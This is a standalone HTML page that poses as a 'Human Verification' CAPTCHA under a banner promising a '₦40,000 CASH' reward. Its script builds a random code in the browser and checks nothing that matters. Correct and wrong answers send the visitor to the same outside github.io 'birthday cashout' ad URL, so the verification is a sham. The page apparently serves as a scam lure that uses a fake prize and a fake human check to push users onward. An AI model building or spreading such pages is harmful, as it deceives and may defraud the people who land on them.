<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Human Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f4f4f9;
      margin: 0;
    }
    .captcha-box {
      background: #ffffff;
      padding: 25px 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 300px;
    }
    .captcha-display {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #e9ecef;
      padding: 10px 15px;
      border-radius: 5px;
      margin: 15px 0;
      font-size: 24px;
      font-weight: bold;
      letter-spacing: 5px;
      user-select: none;
      text-decoration: line-through;
    }
    .refresh-btn {
      background: none;
      border: none;
      font-size: 18px;
      cursor: pointer;
    }
    input[type="text"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
      font-size: 16px;
    }
    .submit-btn {
      width: 100%;
      padding: 10px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    .submit-btn:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body onload="generateCaptcha()">

  <div class="captcha-box">
    <h1>🎁 Reward: ₦40,000 CASH</h1>
    <h2>Verify You Are Human</h2>
    <p>Enter the code shown below:</p>

    <div class="captcha-display">
      <span id="captcha-text"></span>
      <button type="button" class="refresh-btn" onclick="generateCaptcha()" title="New Code">↻</button>
    </div>

    <form onsubmit="validateCaptcha(event)">
      <input type="text" id="user-input" placeholder="Enter CAPTCHA" required autocomplete="off">
      <button type="submit" class="submit-btn">Verify</button>
    </form>
  </div>

  <script>
    let currentCaptcha = "";

    function generateCaptcha() {
      const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
      currentCaptcha = "";
      for (let i = 0; i < 6; i++) {
        currentCaptcha += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      document.getElementById("captcha-text").innerText = currentCaptcha;
      document.getElementById("user-input").value = "";
    }

    function validateCaptcha(event) {
      event.preventDefault();
      const userInput = document.getElementById("user-input").value.trim();

      if (userInput === currentCaptcha) {
        // Redirect if CORRECT
        window.location.href = "https://gongithid.github.io/ads/001-obo-bithdaycashout";
      } else {
        // Redirect if INCORRECT
        window.location.href = "https://gongithid.github.io/ads/001-obo-bithdaycashout";
      }
    }
  </script>

</body>
</html>
